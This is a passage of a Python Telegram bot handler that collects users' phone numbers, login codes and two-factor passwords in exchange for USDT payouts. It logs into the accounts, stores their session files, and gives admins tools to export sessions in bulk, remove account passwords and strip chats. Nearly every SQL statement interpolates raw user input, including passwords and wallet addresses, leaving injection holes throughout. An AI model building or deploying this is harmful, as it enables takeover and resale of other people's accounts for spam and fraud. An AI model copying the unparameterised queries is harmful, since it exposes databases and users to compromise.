        txtcap = message.caption
    ex_text = text.split("_")
    
    timestamp = int(time.time())

    cs = utl.Database()
    cs = cs.data()

    cs.execute(f"SELECT * FROM {utl.admin}")
    row_admin = cs.fetchone()
    cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={from_id}")
    row_user = cs.fetchone()
    if row_user is None:
        cs.execute(f"INSERT INTO {utl.users} (user_id,status,step,created_at,uniq_id) VALUES ({from_id},0,'start',{timestamp},'{utl.unique_id()}')")
        cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={from_id}")
        row_user = cs.fetchone()
    ex_step = row_user['step'].split(';')

    cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE creator_user_id={from_id} AND user_id IS NOT NULL AND status=1")
    accs_active = cs.fetchone()["count"]
    
    try:
        inline_keyboard = []
        if row_admin['channel_1'] is not None and bot.get_chat_member(chat_id=f"@{row_admin['channel_1']}", user_id=from_id).status == "left":
            inline_keyboard.append([{'text': 'Enter channel', 'url': f"https://t.me/{row_admin['channel_1']}"}])
        if row_admin['channel_2'] is not None and bot.get_chat_member(chat_id=f"@{row_admin['channel_2']}", user_id=from_id).status == "left":
            inline_keyboard.append([{'text': 'Enter channel', 'url': f"https://t.me/{row_admin['channel_2']}"}])
        if row_admin['channel_3'] is not None and bot.get_chat_member(chat_id=f"@{row_admin['channel_3']}", user_id=from_id).status == "left":
            inline_keyboard.append([{'text': 'Enter channel', 'url': f"https://t.me/{row_admin['channel_3']}"}])
        if inline_keyboard:
            inline_keyboard.append([{'text': ' ✅ Confirm membership ✅', 'callback_data': "start"}])
            return message.reply_html(
                text=f"🔥 Dear user {first_name}, please subscribe to our channels to access all parts of the robot",
                reply_markup={'inline_keyboard': inline_keyboard}
            )
    except:
        pass
    if text == '/start' or text == utl.menu_var:
        if not row_admin['onoff_bot']:
            return message.reply_html(text="The bot is down for maintenance, please try again in a few minutes", reply_to_message_id=message_id)
        cs.execute(f"UPDATE {utl.users} SET step='start' WHERE user_id={from_id}")
        return user_panel(message)
    if row_admin['onoff_bot']:
        if ex_step[0] == 'add_acc':
            cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_step[2])}")
            row_mbots = cs.fetchone()
            if row_mbots is None:
                return message.reply_html(text="❌ Unknown error!")
            elif ex_step[1] == 'phone':
                phone = text.replace("+","").replace(" ","")
                try:
                    parse_phone = phonenumbers.parse(f"+{phone}")
                    if not phonenumbers.is_possible_number(parse_phone):
                        return message.reply_html(text="❌ Send the wrong format of your number along with the prefix")
                    cs.execute(f"SELECT * FROM {utl.countries} WHERE area_code={parse_phone.country_code} AND is_useable=1 AND is_exists=1")
                    row_countries = cs.fetchone()
                    if row_countries is None:
                        return message.reply_html(text="❌ This country is not currently supported")
                    if row_countries["occupied"] >= row_countries["capacity"]:
                        return message.reply_html(text="❌ This country's account limit is reached")
                    print(row_countries['name_en'])
                except:
                    return message.reply_html(text="❌ Send the wrong format of your number along with the prefix")
                cs.execute(f"SELECT * FROM {utl.mbots} WHERE phone='{phone}' AND status=1")
                if cs.fetchone() is not None:
                    return message.reply_html(text="❌ The account you sent is in the list of robot accounts, please send another account")
                info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                cs.execute(f"UPDATE {utl.mbots} SET creator_user_id={from_id},phone='{phone}',country_id={row_countries['id']},amount={row_countries['amount']} WHERE id ={row_mbots['id']}")
                os.system(f"{utl.python_version} \"{directory}/tl_account.py\" {row_mbots['uniq_id']} {message_id} code")
                return info_msg.delete()
            elif ex_step[1] == 'code':

                try:
                    ex_nl_text = text.split("\n")
                    if len(ex_nl_text) == 1:
                        code = int(text)
                        cs.execute(f"UPDATE {utl.mbots} SET code={code} WHERE id={row_mbots['id']}")
                    elif len(ex_nl_text) == 2:
                        code = int(ex_nl_text[0])
                        password = ex_nl_text[1]
                        if len(password) > 200:
                            return message.reply_html(text="❌ Please send according to the description!")
                        cs.execute(f"UPDATE {utl.mbots} SET code={code},password='{password}' WHERE id={row_mbots['id']}")
                    info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                    os.system(f"{utl.python_version} \"{directory}/tl_account.py\" {row_mbots['uniq_id']} {message_id} auth")
                    return info_msg.delete()
                except:
                    return message.reply_html(text="❌ Please send according to the description!")
        elif text == '📤 Send Account':
            if not row_admin['onoff_account']:
                return message.reply_html(text="❌ Dear user, this section is currently closed, try again in a few minutes!")
            cs.execute(f"DELETE FROM {utl.mbots} WHERE creator_user_id={from_id} AND status=0 AND user_id IS NULL")
            row_apis = utl.select_api(cs, row_admin['api_per_number'])
            if row_apis is None:
                return message.reply_html(text="❌ It is currently not possible to receive the account, please try again in a few minutes")
            else:
                uniq_id = utl.unique_id()
                cs.execute(f"INSERT INTO {utl.mbots} (cat_id,creator_user_id,api_id,api_hash,status,created_at,uniq_id) VALUES (1,{from_id},'{row_apis['api_id']}','{row_apis ['api_hash']}',0,'{timestamp}','{uniq_id}')")
                cs.execute(f"SELECT * FROM {utl.mbots} WHERE uniq_id='{uniq_id}'")
                row_mbots = cs.fetchone()
                if row_mbots is not None:
                    cs.execute(f"UPDATE {utl.users} SET step='add_acc;phone;{row_mbots['id']}' WHERE user_id={from_id}")
                    return message.reply_html(
                        text="🔢 Send your virtual number along with prefix:",
                        reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.menu_var}]]}
                    )
                else:
                    return message.reply_html(text="❌ Something went wrong, try again")
        elif text == '☎️ Support':
            if not row_admin['onoff_support']:
                return message.reply_html(text="❌ Dear user, this section is currently closed, try again in a few minutes!")
            cs.execute(f"UPDATE {utl.users} SET step='support;none' WHERE user_id={from_id}")
            return message.reply_html(
                text="For direct communication 👈🏻\n"
                    f"@{row_admin['support']}\n\n"
                    "🧑 💻 The support department tries to answer all received messages in less than a few hours, so please be patient until you receive a response!\n\n"
                    "⚠️ Dear user, please read the help section completely before sending a message !!\n\n"
                    "💬 Please send your message, question, suggestion or criticism in the form of a single message completely:",
                reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.menu_var}]]}
            )
        elif ex_step[0] == 'support':
            try:
                content = f"🔔 New support for (<a href='tg://user?id={from_id}'>{from_id}</a> | /d_{from_id})\n——————— ———————————\n{txtcap}"
                reply_markup = {'inline_keyboard': [[{'text': "Send Message",'callback_data': f"d;{from_id};sendmsg"}]]}
                if message.text:
                    bot.send_message( chat_id=utl.admins[0], text=content, parse_mode='HTML', reply_markup=reply_markup)
                elif message.photo:
                    bot.send_photo(chat_id=utl.admins[0], caption=content, photo=message.photo[len(message.photo) - 1].file_id, parse_mode='HTML', reply_markup=reply_markup)
                elif message.video:
                    bot.send_video(chat_id=utl.admins[0], caption=content, video=message.video.file_id, parse_mode='HTML', reply_markup=reply_markup)
                elif message.audio:
                    bot.send_audio(chat_id=utl.admins[0], caption=content, audio=message.audio.file_id, parse_mode='HTML', reply_markup=reply_markup)
                elif message.voice:
                    bot.send_voice(chat_id=utl.admins[0], caption=content, voice=message.voice.file_id, parse_mode='HTML', reply_markup=reply_markup)
                elif message.document:
                    bot.send_document(chat_id=utl.admins[0], caption=content, document=message.document.file_id, parse_mode='HTML', reply_markup=reply_markup)
                else:
                    return message.reply_html(text="⛔️ message is not supported")
                cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                return message.reply_html(text="Your message has been sent to the support unit, please be patient to receive a reply...", reply_to_message_id=message_id)
            except:
                return message.reply_html(text="❌ Unknown error, try again")
        elif text == "✅ Settlement" or text == 'back to settlement ↪️':
            cs.execute(f"DELETE FROM {utl.withdrawal} WHERE user_id={from_id} AND status=0")
            if not row_admin['onoff_withdrawal']:
                return message.reply_html(text="❌ Dear user, this section is currently closed, try again in a few minutes!")
            if row_user['balance'] < row_admin['min_withdrawal']:
                return message.reply_html(text=f"Your balance must be at least {row_admin['min_withdrawal']} USDT", reply_to_message_id=message_id)
            uniq_id = utl.unique_id()
            cs.execute(f"INSERT INTO {utl.withdrawal} (user_id,status,created_at,uniq_id) VALUES ({from_id},0,{timestamp},'{uniq_id}')")
            cs.execute(f"SELECT * FROM {utl.withdrawal} WHERE uniq_id='{uniq_id}'")
            row_withdrawal = cs.fetchone()
            if row_withdrawal is not None:
                cs.execute(f"UPDATE {utl.users} SET step='withdrawal;{row_withdrawal['id']};amount' WHERE user_id={from_id}")
                # return message.reply_html(text="💸 Enter how much you want to withdraw", reply_markup={"resize_keyboard": True, "keyboard": [[{"text": utl.menu_var}]]})
                return message.reply_html(
                    text=f"🆔 User ID: {from_id}\n"
                        f" 📤 Send Accounts: {accs_active}\n"
                        f" 💸 Balance to settle: {row_user['balance']}\n\n"
                        f"⏰ {formatted_datetime}",
                    reply_to_message_id=message_id,
                    reply_markup={"resize_keyboard": True, "keyboard": [[{"text": "♻️ Settle your account"}],[{"text": utl.menu_var}]]}
                )
                ex_step.clear()
                ex_step.extend(f"withdrawal;{row_withdrawal['id']};amount".split(";"))
            else:
                return message.reply_html(text="❌ Something went wrong, try again")
        if ex_step[0] == "withdrawal":
            cs.execute(f"SELECT * FROM {utl.withdrawal} WHERE id={int(ex_step[1])}")
            row_withdrawal = cs.fetchone()
            if row_withdrawal is None:
                return message.reply_html(text="❌ Unknown error!")
            elif ex_step[2] == "amount":
                amount = row_user["balance"] # int(text)
                if amount < row_admin["min_withdrawal"]:
                    return message.reply_html(text=f"The minimum amount that can be withdrawn is {row_admin['min_withdrawal']} USDT", reply_to_message_id=message_id)
                if amount > row_user['balance']:
                    return message.reply_html(text=f"Requested amount must be at most {row_user['balance']} USDT", reply_to_message_id=message_id)
                cs.execute(f"UPDATE {utl.withdrawal} SET amount={amount} WHERE id={row_withdrawal['id']}")
                cs.execute(f"UPDATE {utl.users} SET step='{ex_step[0]};{ex_step[1]};card' WHERE user_id={from_id}")
                return message.reply_html(
                    text="🎫 Enter your <b>Settlement Card</b>"
                    # text="💳 درخواست تسویه حساب به دو صورت قابل انجام است ...\n\n"
                    # "# شبای خود را ارسال کنید ( بدون IR)\n"
                    # "1️⃣ برای ثبت درخواست برداشت بدون کسر کارمزد شماره\n\n"
                    # "2️⃣ برای ثبت درخواست با کسر کارمزد  شماره #کارت خود را ارسال کنید:"
                )
            elif ex_step[2] == "card":
                if " " in text or len(text) < 0:
                    cs.execute(f"UPDATE {utl.users} SET step='start' WHERE user_id={from_id}")
                    return message.reply_html(text=f"❌ Invalid Address")
                cs.execute(f"UPDATE {utl.withdrawal} SET card='{text}' WHERE id={row_withdrawal['id']}")
                cs.execute(f"UPDATE {utl.users} SET step='{ex_step[0]};{ex_step[1]};name' WHERE user_id={from_id}")
            #     return message.reply_html(text="☑️ نام و نام خانوادگی خود را بطور کامل و صحیح ارسال کنید:")
            # elif ex_step[2] == "name":
                row_withdrawal["name"] = str(user_username or from_id) # text
                cs.execute(f"UPDATE {utl.withdrawal} SET name='{row_withdrawal['name']}',status=1 WHERE id={row_withdrawal['id']}")
                cs.execute(f"UPDATE {utl.users} SET balance=balance-{round(row_withdrawal['amount'], 4)},step='start' WHERE user_id={from_id}")
                cs.execute(f"""
                    SELECT c.name_en AS country_name, COUNT(*) AS count
                    FROM {utl.mbots} m
                    JOIN {utl.countries} c ON m.country_id = c.id
                    WHERE m.creator_user_id = {from_id} AND m.user_id IS NOT NULL AND m.status = 1
                    GROUP BY m.country_id
                """)
                country_counts = cs.fetchall()
                cs.execute(f"DELETE FROM {utl.mbots} WHERE creator_user_id={from_id} AND user_id IS NOT NULL AND status=1")
                cs.execute(f"UPDATE {utl.withdrawal} SET status=2 WHERE id={row_withdrawal['id']}")
                country_data = ""
                for row in country_counts:
                    country_name = row['country_name']
                    count = row['count']
                    country_data += f"{country_name} => {count}\n"
                
                bot.send_message(
                    chat_id=utl.admins[0],
                    text=f"✅ New withdrawal request with ID {row_withdrawal['id']}\n\n"
                    f"🔻 User: <a href='tg://user?id={from_id}'>{from_id}</a>\n"
                    f"🔻 Username: @{user_username}\n" 
                    f"🔻 Amount: {row_withdrawal['amount']} USDT ({get_usdt_to_trx(row_withdrawal['amount'])} TRX)\n"
                    # f"🔻 Wallet: <code>{row_withdrawal['card']}</code>\n"
                    f"🔻 Wallet: <code>{text}</code>\n"
                    f"🔻 Date and Time: {formatted_datetime} (GMT+6)\n\n"
                    f"🔻 Accounts: {accs_active} Accounts\n"
                    f"✅ Countries:\n{country_data}",
                    parse_mode="html",

                    reply_markup={
                        "inline_keyboard": [
                            [{"text": "Send Message", "callback_data": f"d;{row_withdrawal['user_id']};sendmsg"}],
                            # [{"text": "✅ Settled ✅", "callback_data": f"withdrawal;{row_withdrawal['id']};accept"}],
                        ]
                    },
                )
                bot.send_message(
                    chat_id=utl.payments_channel,
                    text=f"🌳 <b>Withdrawal Information #X</b>\n"
                        f"🔻 <b>User:</b> <a href='tg://user?id={from_id}'>{from_id}</a>\n\n"
                        f"🔻 <b>Amount:</b> <code>{row_withdrawal['amount']}</code> <b>USDT</b>\n"
                        f"🔻 <b>TRX:</b> <code>{get_usdt_to_trx(row_withdrawal['amount'])}</code> <b>TRX</b>\n"
                        f"🔻 <b>Username:</b> @{user_username}\n\n"
                        f"🔻 <b>Time:</b> {formatted_datetime}\n"
                        f"🔻 <b>Wallet:</b> <code>{text}</code>\n\n"
                        f"🔻 <b>Accounts:</b> {accs_active} Accounts\n"
                        f"🔻 <b>Countries:</b>\n{country_data}",
                    parse_mode="html",
                    # reply_markup={
                    #     "inline_keyboard": [
                    #         [{"text": "ارسال پیام", "callback_data": f"d;{row_withdrawal['user_id']};sendmsg"}],
                    #         [{"text": "✅ تسویه شده ✅", "callback_data": f"withdrawal;{row_withdrawal['id']};accept"}],
                    #     ]
                    # },
                )
                
                return message.reply_html(
                    text=f"✅Settlement request {row_withdrawal['amount']} USDT | {get_usdt_to_trx(row_withdrawal['amount'])} TRX has been Registered\n",
                    reply_to_message_id=message_id,
                    reply_markup={"resize_keyboard": True, "keyboard": [[{"text": utl.menu_var}]]},
                )
        elif text == '👤 User Account':
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE creator_user_id={from_id} AND user_id IS NOT NULL AND status=1")
            accs_active = cs.fetchone()['count']
            message.reply_html(
                text="📊 Your account information statistics :\n\n"
                    f" 👤 User ID: {from_id}\n"
                    f" 📤 Send Accounts: {accs_active if accs_active > 0 else '00'}\n"
                    f" 💸 balance to settle: {row_user['balance'] if row_user['balance'] else '00'}\n\n"
                    f"{formatted_datetime}",
                reply_to_message_id=message_id
            )
            return
        elif text == '🌎 Allowed Countries':
            outout = ""
            cs.execute(f"SELECT * FROM {utl.countries} WHERE is_exists=1")
            result = cs.fetchall()
            for row in result:
                # outout += f"{row['name_fa']} {row['emoji']} : {row['amount']} | +{row['area_code']} | {row["occupied"]}/{row["capacity"]}\n"
                outout += f"+{row['area_code']} | {row['emoji']} {row['name_en']} | {row['amount']}\n"
            message.reply_html(
                text=f"🌎 The list of allowed countries are :\n"
                    "- - - - - - -\n"
                    f"{outout}"

            )
            return
    if from_id in utl.admins or row_user['status'] == 1:
        if text == '/panel' or text == utl.panel_var:
            cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
            return message.reply_html(
                text="Admin Panel:",
                reply_markup={'resize_keyboard': True, 'keyboard': [
                    [{'text': '⚙️ Settings'}, {'text': '📣 Channels'}, {'text': '📊 Statistics'}],
                    [{'text': '👤 User'}, {'text': '👤 users'}],
                    [{'text': '💰 Total Users Balance'}],
                    [{'text': '📋 API List'}, {'text': '➕ Add API'}],
                    [{'text': '📋 settlement list'}, {'text': '📋 account list'}],
                    [{'text': '🌎 Allow Countries'}],
                    [{'text': utl.menu_var}],
                ]}
            )
        if ex_step[0] == 'info_user' or ex_text[0] == '/d':
            user_id_select = int(ex_text[1]) if ex_text[0] == '/d' else int(text)
            cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={user_id_select}")
            row_user_select = cs.fetchone()
            if row_user_select is None:
                message.reply_html(
                    text="❌ The numeric ID is wrong\n\n"
                        "❕ Be careful, the user must have already started the robot"
                )
            else:
                block = 'Block ✅' if row_user_select['status'] == 2 else 'Block ❌'
                block_status = 0 if row_user_select['status'] == 2 else 2
                admin = 'Admin ✅' if row_user_select['status'] == 1 else 'Admin ❌'
                admin_status = 0 if row_user_select['status'] == 1 else 1
                return message.reply_html(
                    text=f"User <a href='tg://user?id={row_user_select['user_id']}'>{row_user_select['user_id']}</a>",
                    reply_markup={'inline_keyboard': [
                        [{'text': "Send message",'callback_data': f"d;{row_user_select['user_id']};sendmsg"}],
                        [
                            {'text': block,'callback_data': f"d;{row_user_select['user_id']};{block_status}"},
                            {'text': admin,'callback_data': f"d;{row_user_select['user_id']};{admin_status}"}
                        ],
                        [{'text': f"Balance: {row_user_select['balance']}",'callback_data': "nazan"}],
                        [
                            {'text': '+5000','callback_data': f"d;{row_user_select['user_id']};balance;+5000"},
                            {'text': '+1000','callback_data': f"d;{row_user_select['user_id']};balance;+1000"},
                            {'text': '-1000','callback_data': f"d;{row_user_select['user_id']};balance;-1000"},
                            {'text': '-5000','callback_data': f"d;{row_user_select['user_id']};balance;-5000"},
                        ],
                    ]}
                )
        if ex_step[0] == 'sendmsg':
            cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={int(ex_step[1])}")
            row_user_select = cs.fetchone()
            if row_user_select is None:
                return message.reply_html(text="❌ شناسه اشتباه است")
            else:
                try:
                    content = f"📧️ Message from support\n—————————————————————\n{txtcap}"
                    if update.message.text:
                        bot.send_message(chat_id=row_user_select['user_id'], text=content, disable_web_page_preview=True, parse_mode='HTML',)
                    elif update.message.photo:
                        bot.send_photo(chat_id=row_user_select['user_id'], photo=update.message.photo[len(update.message.photo) - 1].file_id, caption=content, parse_mode='HTML')
                    elif update.message.video:
                        bot.send_video(chat_id=row_user_select['user_id'], caption=content, video=update.message.video.file_id, parse_mode='HTML')
                    elif update.message.audio:
                        bot.send_audio(chat_id=row_user_select['user_id'], audio=update.message.audio.file_id, caption=content,parse_mode='HTML')
                    elif update.message.voice:
                        bot.send_voice(chat_id=row_user_select['user_id'], caption=content, voice=update.message.voice.file_id,parse_mode='HTML')
                    elif update.message.document:
                        bot.send_document(chat_id=row_user_select['user_id'], caption=content, document=update.message.document.file_id,parse_mode='HTML')
                    else:
                        return message.reply_html(text="⛔️ message is not supported")
                    cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                    return message.reply_html(text="Your message has been sent successfully")
                except:
                    return message.reply_html(text="❌ Unknown error, try again")
        if text =='💰 Total Users Balance':
            cs.execute(f"SELECT user_id, balance FROM {utl.users}")
            rows = cs.fetchall()
            total_users = len(rows)
            total_balance = sum(row['balance'] for row in rows)
            csv_file_path = 'users_report.csv'
            with open(csv_file_path, 'w') as f:
                f.write(f"User_ID,User_Balance\n")
                for row in rows:
                    f.write(f"{row['user_id']},{row['balance']}\n")
            caption = f"Total Users = {total_users}\nTotal Balance = {total_balance}"
            return message.reply_document(open(csv_file_path, 'r'), csv_file_path, caption)
        if text == '👤 User':
            cs.execute(f"UPDATE {utl.users} SET step='info_user;' WHERE user_id={from_id}")
            return message.reply_html(
                text="Send the numeric user ID:\n\n"
                    "❕ You can get help from @info_tel_bot",
                reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.menu_var}]]}
            )
        if ex_step[0] == 'edit_price':
            cs.execute(f"SELECT * FROM {utl.countries} WHERE id={int(ex_step[1])}")
            row_countries = cs.fetchone()
            if row_countries is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                amount = float(text)
                if amount < 0:
                    return
                cs.execute(f"UPDATE {utl.countries} SET amount={amount} WHERE id={row_countries['id']}")
                cs.execute(f"UPDATE {utl.users} SET step='edit_capacity;{row_countries['id']}' WHERE user_id={from_id}")
                return message.reply_html(text=f"Enter new Total Capacity for {row_countries['emoji']} {row_countries['name_fa']}:\n\ncancel: /panel")
        if ex_step[0] == "edit_capacity":
            cs.execute(f"SELECT * FROM {utl.countries} WHERE id={int(ex_step[1])}")
            row_countries = cs.fetchone()
            if row_countries is None:
                return message.reply_html(text="❌ ID is wrong")
            else:
                capacity = int(text)
                if capacity < 0:
                    return
                cs.execute(f"UPDATE {utl.countries} SET capacity={capacity} WHERE id={row_countries['id']}")
                cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                return message.reply_html(text="Updated successfully")
        if ex_step[0] == 'set_pass':
            cs.execute(f"UPDATE {utl.admin} SET account_password='{text}'")
            cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
            return message.reply_html(text="Password has been updated")
        if ex_step[0] == 'get_sessions':
            count = int(text)
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE status=1")
            count_accounts = cs.fetchone()['count']
            if count_accounts < 1:
                return message.reply_html(text="❌ There is currently no account")
            elif count < 1 or count > count_accounts:
                return message.reply_html(text="❌ You can send a maximum of {count_accounts}")
            else:
                info_msg = message.reply_html(text="♻️ Processing, please wait...", reply_to_message_id=message_id)
                cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                if not os.path.exists(f"{directory}/data"):
                    os.mkdir(f"{directory}/data")
                if not os.path.exists(f"{directory}/data/{timestamp}"):
                    os.mkdir(f"{directory}/data/{timestamp}")
                
                count_valid = 0
                cs.execute(f"SELECT * FROM {utl.mbots} WHERE status=1 LIMIT {count}")
                result = cs.fetchall()
                for row_mbots in result:
                    os.system(f"{utl.python_version} \"{directory}/tl_archive_session.py\" {row_mbots['uniq_id']} {from_id} {timestamp}")
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={row_mbots['id']}")
                    row_mbots_select = cs.fetchone()
                    if row_mbots_select['status'] == 1:
                        try:
                            shutil.copy(f"{directory}/sessions/{row_mbots['uniq_id']}.session", f"{directory}/data/{timestamp}")
                            count_valid += 1
                        except:
                            pass
                try:
                    shutil.make_archive(base_name=f"{directory}/data/{timestamp}", format='zip', root_dir=f"{directory}/data/{timestamp}")
                    bot.send_document(
                        chat_id=from_id,
                        document=open(f"{directory}/data/{timestamp}.zip", "rb"),
                        caption=f"Number of {count_valid} sessions",
                        parse_mode='html',
                        reply_to_message_id=message_id
                    )
                except:
                    pass
                utl.remove_path(f"{directory}/data/{timestamp}")
                utl.remove_path(f"{directory}/{timestamp}.zip")
                return info_msg.delete()
        if ex_step[0] == 'add_api':
            try:
                ex_nl_text = text.split("\n")
                if len(ex_nl_text) != 2 or len(ex_nl_text[0]) > 50 or len(ex_nl_text[1]) > 200:
                    return message.reply_html(text="❌ wrong entry")
                elif not re.findall('^[0-9]*$', ex_nl_text[0]):
                    return message.reply_html(text="❌ api id is wrong")
                elif not re.findall('^[0-9-a-z-A-Z]*$', ex_nl_text[1]):
                    return message.reply_html(text="❌ api hash is wrong")
                else:
                    api_id = int(ex_nl_text[0])
                    api_hash = ex_nl_text[1]
                    cs.execute(f"SELECT * FROM {utl.apis} WHERE api_id={api_id} OR api_hash='{api_hash}'")
                    if cs.fetchone() is not None:
                        return message.reply_html(text="❌ This API has already been added")
                    else:
                        cs.execute(f"INSERT INTO {utl.apis} (api_id,api_hash) VALUES ({api_id},'{api_hash}')")
                        return message.reply_html(
                            text=" ✅ added successfully\n\n"
                                "Submit another IP:",
                            reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.panel_var}]]}
                        )
            except:
                return message.reply_html(text="❌ Send according to the sample")
        if text == '➕ Add API':
            cs.execute(f"UPDATE {utl.users} SET step='add_api;' WHERE user_id={from_id}")
            return message.reply_html(
                text="Send as sample:\n\n"
                    "example:\n"
                    "api id\n"
                    "api hash",
                reply_markup={'resize_keyboard': True, 'keyboard': [[{'text': utl.panel_var}]]}
            )
        if text == '📋 API List':
            cs.execute(f"SELECT * FROM {utl.apis} ORDER BY id DESC LIMIT 0,{utl.step_page}")
            result = cs.fetchall()
            if not result:
                return message.reply_html(text="⛔️ The list is empty")
            else:
                output = ""
                i = 1
                for row in result:
                    output += f"🔴️ Api ID: <code>{row['api_id']}</code>\n"
                    output += f"🔴️ Api Hash: <code>{row['api_hash']}</code>\n"
                    output += f"❌ Delete: /DeleteApi_{row['id']}\n\n"
                    i += 1
                cs.execute(f"SELECT COUNT(*) as count FROM {utl.apis}")
                rowcount = cs.fetchone()['count']
                output = f"📜 API list ({rowcount})\n\n{output}"
                ob = utl.Pagination(update, "apis", output, utl.step_page, rowcount)
                return ob.process()
        if text == '📋 account list':
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL")
            accs_all = cs.fetchone()['count']
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=0")
            accs_first_level = cs.fetchone()['count']
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=1")
            accs_active = cs.fetchone()['count']
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=3")
            accs_waite_exit = cs.fetchone()['count']
            return message.reply_html(
                text="📋 Accounts",

                reply_markup={'inline_keyboard': [
                    [{'text': f"💢 all ({accs_all}) 💢", 'callback_data': f"pg;accounts;1"}],
                    [
                        {'text': f"⛔️ Logout ({accs_first_level})", 'callback_data': f"pg;first_level;1"},
                        {'text': f" ✅ Active ({accs_active})", 'callback_data': f"pg;submitted;1"}
                    ],
                    [
                        {'text': f"♻️ Waiting for exit ({accs_waite_exit})", 'callback_data': f"pg;waite_exit;1"}
                    ],
                    [{'text': "👇 Commands 👇", 'callback_data': "nazan"}],
                    [{'text': "✔️ Delete logged out accounts ✔️", 'callback_data': "gc;delete_logout;none"}],
                    [{'text': "✔️ Leave group and channels ✔️", 'callback_data': "gc;leave_channel;none"}],
                    [{'text': "✔️ Remove Pews ✔️", 'callback_data': "gc;leave_private;none"}],
                    [{'text': "✔️ Leave channel / group / delete peews ✔️", 'callback_data': "gc;leave_chat;none"}],
                    [{'text': "✔️ Delete account passwords ✔️", 'callback_data': "gc;delete_password;none"}],
                    [{'text': "📥 Get session 📥", 'callback_data': "gc;get_session;none"}],
                    [{'text': "❌ Delete all sessions ❌", 'callback_data': "gc;del_sessions;none"}],
                ]}
            )
        if text == '📋 settlement list':
            cs.execute(f"SELECT * FROM {utl.withdrawal} ORDER BY id DESC LIMIT 0,{utl.step_page}")
            result = cs.fetchall()
            if not result:
                return message.reply_html(text="⛔️ The list is empty")
            else:
                output = ""
                i = 1
                for row in result:
                    output += f"🔰 ID: /w_{row['id']} ({utl.status_withdrawal[row['status']]})\n"
                    i += 1
                cs.execute(f"SELECT COUNT(*) as count FROM {utl.withdrawal}")
                rowcount = cs.fetchone()['count']
                output = f"📜 settlement list ({rowcount})\n\n{output}"
                ob = utl.Pagination(update, "withdrawal", output, utl.step_page, rowcount)
                return ob.process()
        if ex_step[0] == 'sendmsg':
            cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={int(ex_step[1])}")
            row_user_select = cs.fetchone()
            if row_user_select is None:
                message.reply_html(text=f"❌ User not found")
            else:
                try:
                    if message.text:
                        bot.send_message(chat_id=chat_id,disable_web_page_preview=True,parse_mode='HTML',
                        text=f"📧️ New message from support\n—————————————————————\n{txtcap}"
                    )
                    elif message.photo:
                        bot.send_photo(chat_id=chat_id,parse_mode='HTML',
                            photo=message.photo[len(message.photo) - 1].file_id,
                            caption=f"📧️ New message from support\n————————————————————\n{txtcap}"
                        )
                    elif message.video:
                        bot.send_video(chat_id=chat_id,parse_mode='HTML',
                            video=message.video.file_id,
                            caption=f"📧️ New message from support\n————————————————————\n{txtcap}"
                        )
                    elif message.audio:
                        bot.send_audio(chat_id=chat_id,parse_mode='HTML',
                            audio=message.audio.file_id,
                            caption=f"📧️ New message from support\n————————————————————\n{txtcap}"
                        )
                    elif message.voice:
                        bot.send_voice(chat_id=chat_id,parse_mode='HTML',
                            voice=message.voice.file_id,
                            caption=f"📧️ New message from support\n————————————————————\n{txtcap}"
                        )
                    elif message.document:
                        bot.send_document(chat_id=chat_id,parse_mode='HTML',
                            document=message.document.file_id,
                            caption=f"📧️ New message from support\n————————————————————\n{txtcap}"
                        )
                    else:
                        return message.reply_html(text="⛔️ message is not supported")
                    cs.execute(f"UPDATE {utl.users} SET step='panel' WHERE user_id={from_id}")
                    message.reply_html(text="Your message has been sent successfully")
                except:
                    message.reply_html(text="❌ There was a problem sending the message")
        if text == '📊 Statistics':
            # now = jdatetime.datetime.now()
            # time_today = jdatetime.datetime(day=(now.day-1), month=now.month, year=now.year).timestamp()
            
            outout = ""
            cs.execute(f"SELECT *,COUNT(*) as count FROM {utl.mbots} WHERE country_id>0 GROUP BY country_id")
            result = cs.fetchall()
            for row in result:
                cs.execute(f"SELECT * FROM {utl.countries} WHERE id={row['country_id']}")
                row_countries = cs.fetchone()
                outout += f"‏{row_countries['emoji']} {row_countries['name_fa']}: {row['count']}\n"

            cs.execute(f"SELECT COUNT(*) as count FROM {utl.users}")
            count_users = cs.fetchone()['count']
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.withdrawal} WHERE status=1")
            count_withdrawal_doing = cs.fetchone()['count']
            cs.execute(f"SELECT COUNT(*) as count FROM {utl.withdrawal} WHERE status=2")
            count_withdrawal_done = cs.fetchone()['count']

            message.reply_html(
                text=f"📊 account statistics\n\n"
                    f"{outout}"
            )
            return message.reply_html(
                text=f"📊 bot statistics\n\n"
                    f"• Total users: {count_users:,}\n"
                    f"• Pending withdrawals: {count_withdrawal_doing:,}\n"
                    f"• Withdrawals done: {count_withdrawal_done:,}\n"
                    f"\n"
                    f""
            )
        if ex_step[0] == 'panel_channels':
            if text == utl.back_var:
                text = '📣 Channels'
